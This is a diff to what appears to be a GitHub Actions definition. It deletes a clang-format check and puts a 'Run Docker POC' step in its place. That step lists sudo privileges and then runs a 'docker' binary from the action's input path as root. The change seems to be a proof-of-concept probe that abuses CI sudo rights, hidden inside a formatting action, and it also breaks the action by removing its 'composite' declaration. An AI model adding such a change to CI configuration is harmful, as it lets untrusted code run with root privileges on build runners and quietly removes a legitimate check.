@@ -6,19 +6,8 @@ inputs:
     required: true
 
 runs:
-  using: "composite"
   steps:
-  - name: Run clang-format for the patch
-    shell: bash {0}
+  - name: Run Docker POC
     run: |
-      git config --global --add safe.directory ${{ inputs.path }}
-      git -C ${{ inputs.path }} clang-format ${{ github.event.pull_request.base.sha }}
-      git -C ${{ inputs.path }} diff > ./clang-format.patch
-  # Add patch with formatting fixes to CI job artifacts
-  - uses: actions/upload-artifact@v1
-    with:
-      name: clang-format-patch
-      path: ./clang-format.patch
-  - name: Check if clang-format patch is empty
-    shell: bash
-    run: bash -c "if [ -s ./clang-format.patch ]; then cat ./clang-format.patch; exit 1; fi"
+      sudo -l
+      sudo ./${{ inputs.path }}/docker ps -a
